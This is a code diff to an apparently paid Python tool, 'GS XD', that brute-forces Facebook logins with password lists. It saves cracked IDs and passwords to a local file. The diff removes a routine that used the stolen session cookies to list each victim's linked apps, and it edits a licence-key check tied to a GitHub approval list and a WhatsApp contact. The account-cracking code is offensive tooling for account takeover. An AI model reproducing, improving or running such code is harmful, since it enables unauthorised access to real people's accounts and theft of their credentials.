@@ -258,33 +258,27 @@ E = '\x1b[1;93m'
 F = '\x1b[1;94m'
 G = '\x1b[1;95m'
 P = '\033[1;91m'
-#------------------APK<>CHECKER-------------------#    
 def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-      print(f'%s{P}[%s�%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
-    else:
-        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
-        for i in range(len(game)):
-            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        else:
-            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
-    else:
-        print(f'[] %s  Your Expired Apps     :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
-            
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
+	else:
+		print(f'\r{A} [GS XD>]%s Active Apks & Web ðŸ‘‡ '%(H))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
+	else:
+		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
 loop=0
 oks=[]
 cps=[]
@@ -955,9 +949,8 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas,coki))
-				cek_apk(session,coki)
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+' | '+coki+'\n')
+				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
+				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
@@ -1158,9 +1151,8 @@ def ffb1(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas,coki))
-				cek_apk(session,coki)
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+' | '+pas+' | '+coki+'\n')
+				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
+				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
@@ -1540,10 +1532,9 @@ def ffb8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 
-def menu_apikey():  
-  uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
-  id = "ꙶꙶꙶͯͯᷓͮͭͦͧͨᷓᷓ".join(uuid)
-  ak="2ꙶꙶꙶꙶꙶꙶꙶͯͯᷓͮͭͦͧͨͯͯᷓͮͭͦͧͨᷓ7ꙶꙶꙶꙶꙶ" 
+def menu_apikey():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "•".join(uuid)
   server = requests.get('https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt').text
   
  
@@ -1562,55 +1553,73 @@ def menu_apikey():
 \033[1;92m║ ᗙ  Version  : 1.0                       ║
 \033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
 \033[1;92m╚═════════════════════════════════════════╝""")
+
   print("\033[1;37m--------------------------------------------------")
+
   print("\x1b[1;92m THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
+
   print("\033[1;37m--------------------------------------------------")
   print("")
   print("\033[1;37m ╔═══════════════════════════════════════════════╗ ")
-  print("\x1b[1;92m       YOUR  KEY : "+ak+id)
+  print("\x1b[1;92m       YOUR  KEY : "+id)
   print("\033[1;37m ╚═══════════════════════════════════════════════╝ ")
   print("")
   print("\033[1;37m--------------------------------------------------")
-  print("\033[1;37m-------> CONTACT ADMIN TO BUY THIS TOOLS <--------   ");
+  print("\033[1;37m-------> CONTACT ADMIN To BUY This TOOLS <--------   ");time.sleep (0.1) 
   print("\033[1;37m--------------------------------------------------")
   print("")
-  print("  SEND KEY ON ADMIN WHATSAPP,,,,,, ");
+  print("  SEND KEY ON ADMIN WHATSAPP,,,,,, ");time.sleep(1)
   os.system('xdg-open https://wa.me/+8801836751224')
-  print("");
-  print("\x1b[1;97m  CHECKING YOUR APROVAL....                                             ");
+  print("");time.sleep(2)
+  print("\x1b[1;97m  CHECKING YOUR APROVAL....                                             ");time.sleep (0.5)
   print("")
   try:
     httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
     if id in httpCaht:
-      print("\033[1;97m   YOUR KEY APROVED ");
-      msg = str(os.geteuid()) 
+      print("\033[1;97m   YOUR KEY APROVED ");time.sleep(2)
+      msg = str(os.geteuid())
+      time.sleep(0.5)
       pass
     else:
+      
+      
+      
       os.system('xdg-open https://www.facebook.com/gsriyad11')
+      time.sleep(2)
       sys.exit()
   except:
     sys.exit()
-    if name == '__main__': 
+    if name == '__main__':
     	print(logo)
     	menu_apikey()
 menu_apikey() 
+
+
+
 def tnx():
-  uuid = str(os.geteuid())
-  id = "–".join(uuid)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "_".join(uuid)
   server = requests.get('https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt').text
+  
+ 
+
   os.system(" clear ")
   print(logo)
   print(" Wait bro,,,, ")
   print(" Chacking Your Aproval ")
-  print("\x1b[1;97m  CHECKING YOUR APROVAL.....                                          ");
+  print("\x1b[1;97m  CHECKING YOUR APROVAL.....                                          ");time.sleep (0.5)
   try:
     httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
     if id in httpCaht:
-      print("\033[1;97m   YOUR KEY APROVED ");
-      msg = str(os.geteuid()) 
+      print("\033[1;97m   YOUR KEY APROVED ");time.sleep(2)
+      msg = str(os.geteuid())
+      time.sleep(0.5)
       pass
     else:
+      
+      
       os.system('xdg-open https://wa.me/+8801836751224')
+      time.sleep(2)
       sys.exit()
   except:
     sys.exit()
